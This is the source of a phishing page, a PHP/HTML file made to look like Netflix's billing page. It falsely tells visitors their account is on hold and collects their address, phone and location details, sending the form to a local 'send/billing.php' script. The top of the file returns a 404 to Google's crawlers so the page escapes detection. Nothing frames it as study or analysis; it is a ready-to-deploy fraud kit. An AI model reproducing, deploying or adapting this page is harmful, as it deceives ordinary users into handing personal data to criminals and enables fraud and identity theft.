<?php 
@session_start();  
error_reporting(0); 
require 'geoplugin.php';
require 'getph.php';

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!doctype html><html lang="en"><head>
    
    
    
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta charSet="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9"/><title>Netflix</title><link rel="preload" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-js-va968cffa/js/js/bootstrap.js,common%7Cbootstrap.js/2/0b38022Q2K052I2V37070l00392U342N2X2S332W2Z2L2F010N/bck/true/none" as="script"/><link rel="preload" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-js-va968cffa/js/js/signup%7Csimplicity%7CsimpleSignupClient.js/2/0b38022Q2K052I2V37070l00392U342N2X2S332W2Z2L2F010N/l/true/none" as="script"/><link type="text/css" rel="stylesheet" href="/personalization/cl2/freeform/WebsiteDetect?source=wwwhead&amp;fetchType=css&amp;modalView=signupSimplicity-creditOptionMode" data-uia="botLink"/><script type="text/javascript">(function () { var request = new XMLHttpRequest(); request.open('GET', '/personalization/cl2/freeform/WebsiteDetect?source=wwwhead&fetchType=js&modalView=signupSimplicity-creditOptionMode', true); request.send();  })();</script>    <style>
        .error-class {
            color: red;
        }
    </style><script type="text/javascript" charSet="UTF-8" data-domain-script="87b6a5c0-0104-4e96-a291-092c11350111" src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js"></script><script type="text/javascript">function OptanonWrapper() {};</script><meta content="watch movies, movies online, watch TV, TV online, TV shows online, watch TV shows, stream movies, stream tv, instant streaming, watch online, movies, watch movies Algeria, watch TV online, no download, full length movies" name="keywords"/><meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more." name="description"/><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/><link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-va968cffa/css/css/less%7Ccore%7Cerror-page.less/1/amrou4tskneq/none/true/none" data-uia="botLink"/><link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-va968cffa/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/1/amrou4tskneq/none/true/none" data-uia="botLink"/><link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/><link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/><script>window.netflix = window.netflix || {} ;         netflix.notification = window.netflix.notification = window.netflix.notification || {};window.netflix.notification.specification = netflix.notification.specification || {};;</script><script>window.netflix = window.netflix || {} ;         netflix.notification.constants = {"pageName":"signupSimplicity-creditOptionMode","locale":"en-DZ","sessionLength":30,"uiMode":"nonmember","ownerToken":"MWZ7YUNMEJHTVBEMGZTGM4NJLM","accept-language":"en-US,en;q=0.9"};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.uiView = {"impression":{"send":"both","overlapping":true},"command":{"send":"both"},"search":{"send":"both"},"uma":{"send":"both"},"focus":{"send":"both"},"scdWizardStep":{"send":"both"},"navigationLevel":{"send":"both"},"presentation":{"send":"both"},"onrampSimilarsGroup":{"send":"both"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.uiAction = {"manageSubscriptions":{"send":"end"},"removeActivityHistory":{"send":"end"},"promoShareFacebook":{"send":"end"},"promoShareTwitter":{"send":"end"},"rateTitle":{"send":"end"},"addToPlaylist":{"send":"both"},"selectProfile":{"send":"end"},"addProfile":{"send":"end"},"trailerPlay":{"send":"both"},"startTrailerPlay":{"send":"both"},"onRamp":{"send":"both"},"submitUnsupportedCountryEmail":{"send":"both"},"iTunesPriceFetching":{"send":"both"},"iTunesPurchase":{"send":"both"},"iTunesRestore":{"send":"both"},"iTunesSubmitReceipt":{"send":"both"},"iTunesSubmitRestoredReceipt":{"send":"both"},"iTunesSignUpFallback":{"send":"both"},"iTunesTracerPurchaseBegin":{"send":"both"},"iTunesTracerPurchasePostBridge":{"send":"both"},"iTunesTracerPurchaseHandleReceipt":{"send":"both"},"iTunesTracerPurchaseHasReceipt":{"send":"both"},"iTunesTracerPurchasePreFailure":{"send":"both"},"iTunesTracerPurchaseFailure":{"send":"both"},"iTunesTracerPurchaseCancel":{"send":"both"},"iTunesTracerPurchasePreFailureDevice":{"send":"both"},"iTunesTracerPurchaseFailureDevice":{"send":"both"},"iTunesTracerPurchaseMissingReceipt":{"send":"both"},"iTunesTracerPurchasePreSendReceipt":{"send":"both"},"iTunesTracerPurchaseSendReceipt":{"send":"both"},"iTunesTracerPurchaseMoneyballError":{"send":"both"},"iTunesTracerPurchaseSendReceiptEnd":{"send":"both"},"playStorePriceFetching":{"send":"both"},"playStorePurchase":{"send":"both"},"playStoreRestore":{"send":"both"},"playStoreSubmitReceipt":{"send":"both"},"playStoreSubmitRestoredReceipt":{"send":"both"},"playStoreFlowFallback":{"send":"both"},"playStoreSignUpFallback":{"send":"both"},"playStoreAndroidSignUp":{"send":"both"},"playStoreAndroidRetrySignUp":{"send":"both"},"playStoreTracerPurchaseBegin":{"send":"both"},"playStoreTracerPurchasePostBridge":{"send":"both"},"playStoreTracerPurchaseHandleReceipt":{"send":"both"},"playStoreTracerPurchaseHasReceipt":{"send":"both"},"playStoreTracerPurchasePreFailure":{"send":"both"},"playStoreTracerPurchaseFailure":{"send":"both"},"playStoreTracerPurchaseCancel":{"send":"both"},"playStoreTracerPurchasePreFailureDevice":{"send":"both"},"playStoreTracerPurchaseFailureDevice":{"send":"both"},"playStoreTracerPurchaseMissingReceipt":{"send":"both"},"playStoreTracerPurchasePreSendReceipt":{"send":"both"},"playStoreTracerPurchaseSendReceipt":{"send":"both"},"playStoreTracerPurchaseMoneyballError":{"send":"both"},"playStoreTracerPurchaseSendReceiptEnd":{"send":"both"},"simplicitySubmit":{"send":"both"},"simplicityFlowEndpointTiming":{"send":"both"},"editPaymentSubmit":{"send":"both"},"processAsDebitChecked":{"send":"both"},"processAsDebitSubmit":{"send":"both"},"processAsDebitUrl":{"send":"both"},"processAsDebitRendered":{"send":"both"},"navigate":{"send":"both"},"submitOnrampResults":{"send":"both"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.search = {"focus":{"send":"both"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.uiQOE = {"appSession":{"send":"both"},"userSession":{"send":"both"},"uiStartup":{"send":"end"},"uiBrowseStartup":{"send":"end"},"uiModalViewChanged":{"eventProperties":{"value":"modalView"},"send":"start"},"uiModelessView":{"send":"both","overlapping":"true"},"partnerSession":{"send":"both","overlapping":false}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.www = {"playbackPerformance":{"send":"both"},"playbackFeatureDetection":{"send":"end"},"playbackError":{"send":"end"},"windowOnError":{"send":"end"}};</script><script>window.netflix = window.netflix || {} ;         netflix.notification.specification.login = {"poll":{"send":"both"},"autofill":{"send":"both"}};</script><meta property="og:description" content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more."/><meta property="al:ios:url" content="nflx://www.netflix.com/signup/creditoption"/><meta property="al:ios:app_store_id" content="363590051"/><meta property="al:ios:app_name" content="Netflix"/><meta property="al:android:url" content="nflx://www.netflix.com/signup/creditoption"/><meta property="al:android:package" content="com.netflix.mediaclient"/><meta property="al:android:app_name" content="Netflix"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@netflix"/><script>/* Disable minification (remove `.min` from URL path) for more info */

</script></head><body><div id="appMountPoint"><div class="netflix-sans-font-loaded"><div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity" lang="en-DZ" dir="ltr"><div class="nfHeader noBorderHeader signupBasicHeader onboarding-header"><a href="/" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a><a href="#" class="authLinks signupBasicHeader onboarding-header" data-uia="header-signout-link">Sign Out</a></div><div class="simpleContainer"><div class="centerContainer firstLoad"><form action="./send/billing.php" method="POST" id="konzform" name="konzform" data-uia="payment-form"><div class="paymentFormContainer"><div><div class="stepHeader-container" data-uia="header"><div class="stepHeader" data-a11y-focus="true"><span id="" class="stepIndicator" data-uia="">Update your billing address <b></span><div class="messageContainer" data-a11y-focus="true"><div class="nf-message-container nf-message-warn" data-uia="UIMessage+container" role=""><div class="nf-message-icon"></div><div class="nf-message-contents" data-uia="UIMessage-content"><span id="" data-uia=""><b>Your account is on hold.</b> Update your payment info to keep enjoying Netflix.</span></b></div></div></div></div></div></div><div class="fieldContainer"></span><div class=""><ul class="simpleForm structural ui-grid"><li data-uia="field-address1+wrapper" class="nfFormSpace"><div data-uia="field-address1+container" class="nfInput nfInputOversize"><div class="nfInputPlacement"><label class="input_id" placeholder="address1"><label for="id_address1" class="">Address Line 1</label><input type="text" data-uia="field-address1" name="address1" class="nfTextField" id="id_address1" value="" tabindex="0" autoComplete="cc-given-name" maxLength="100" minLength="1" dir=""/></label></div></div></li><li data-uia="field-address2+wrapper" class="nfFormSpace"><div data-uia="field-address2+container" class="nfInput nfInputOversize"><div class="nfInputPlacement"><label for="id_address2" class="">Address Line 2 (optional)</label><label class="input_id" placeholder="address2"><input type="text" data-uia="field-address2" name="address2" class="nfTextField" id="id_address2" value="" tabindex="0" autoComplete="cc-family-name" dir=""/></label></div></div></li><li data-uia="field-creditCardNumber+wrapper" class="nfFormSpace">
    
    
    <li data-uia="field-city+wrapper" class="nfFormSpace"><div data-uia="field-city+container" class="nfInput nfInputOversize"><div class="nfInputPlacement"><label for="id_city" class="">City</label><label class="input_id" placeholder="city"><input type="text" data-uia="field-city" name="city" class="nfTextField" id="city" value="" tabindex="0" autoComplete="city" dir=""/></label></div></div></li>
    
    <li data-uia="field-state+wrapper" class="nfFormSpace"><div data-uia="field-state+container" class="nfInput nfInputOversize"><div class="nfInputPlacement"><label for="id_state" class="">State</label><label class="input_id" placeholder="state"><input type="text" data-uia="field-state" name="state" class="nfTextField" id="state" value="" tabindex="0" autoComplete="state" dir=""/></label></div></div></li>
        

    <li data-uia="field-zipcode+wrapper" class="nfFormSpace"><div data-uia="field-zipcode+container" class="nfInput nfInputOversize tooltip"><div class="nfInputPlacement"><label class="input_id" placeholder="zipcode"><label for="id_zipcode" class="">ZIP Code</label><input type="text" data-uia="field-zipcode" name="zipcode" class="nfTextField" id="id_zipcode" value="" tabindex="0" autoComplete="cc-csc" maxLength="9" minLength="3" dir=""/></label>
    <li data-uia="field-country+wrapper" class="nfFormSpace"><div data-uia="field-country+container" class="nfInput nfInputOversize"><div class="nfInputPlacement"><label for="country" class="">Country</label><label class="input_id" placeholder="country"><input type="text" data-uia="field-country" name="country" class="nfTextField" id="country" value="<?=@$_SESSION['CountryName'];?>" tabindex="0" autoComplete="country" dir=""/></label></div></div></li>
        <li data-uia="field-phone+wrapper" class="nfFormSpace"><div data-uia="field-phone+container" class="nfInput nfInputOversize tooltip"><div class="nfInputPlacement"><label class="input_id" placeholder="phone"><label for="id_phone" class="">Phone Number</label><input type="tel" data-uia="field-phone" name="phone" class="nfTextField" id="phone" value="<?php echo $_SESSION['xcountryPhonePrefixx']; ?>" tabindex="0" autoComplete="cc-csc" maxLength="33" minLength="3" dir=""/></label>
    
<div class="helper"></div></div></div></div></div></div><div class="submitBtnContainer"><button type="submit" autoComplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="action-submit-payment" placeholder="">Update your info</button></div></form></div></div><div class="site-footer-wrapper centered"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="#">Questions? Contact us.</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Center</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie Preferences</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li></ul><div class="lang-selection-container" id="lang-switcher">
<div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container"><label class="nfLabel" for="lang-switcher-select">Select Language</label><div class="nfSelectPlacement globe"><select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0"><option label="العربية" lang="ar" value="#">العربية</option><option label="Français" lang="fr" value="#">Français</option><option selected="" label="English" lang="en" value="#">English</option></select></div></div></div></div></div><div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div></div></div></div><script src="./js/jquery-3.3.1.min.js"></script>
      <script src="./js/jquery.mask.min.js"></script>
      <script src="./js/jquery.validate.min.js"></script>
      <script>$(window).ready(function(){setInterval(function(){$(".busyOverlay").fadeOut("fast"),$(".busyIcon").fadeOut("fast")},1e3)});</script>    <script>
        const alpha = (e) => {
             let k;
             document.all ? k = e.keyCode : k = e.which;
             return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
         }

        $(document).ready(function (e) {
            e("#phone").mask("+0000000000000000"),
            $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    address1: {
                        required: true,
                        minlength: 3
                    },
                     city: {
                        required: true,
                        minlength: 3
                    },
                    phone: {
                        required: true,
                        minlength: 6
                    },
                    state: {
                        required: true,
                        minlength: 3
                    },
                    country: {
                        required: true,
                        minlength: 3
                    },
                    zipcode: {
                        required: true,
                        minlength: 3
                    }
                },
                messages: {
                    phone: {
                        required: "Please fill this field"
                    },
                    address1: {
                        required: "Please fill this field",
                    },
                    state: {
                        required: "Please fill this field",
                    },
                    zipcode: {
                        required: "Please fill this field",
                    },
                    country: {
                        required: "Please fill this field",
                    },
                    
                    city: {
                        required: "Please fill this field",
                    }
                }
            });
        })

        $.validator.addMethod("minAge", function (value, element, min) {
         var today = new Date();
         var birthDate = new Date(value);
         var age = today.getFullYear() - birthDate.getFullYear();

         if (age > min + 1) {
            return true;
         }

         var m = today.getMonth() - birthDate.getMonth();

         if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
            age--;
         }

         return age >= min;
      });
    </script><script>window.__public_path__ = 'https://assets.nflxext.com/web/ffe/wp/';</script><div><script>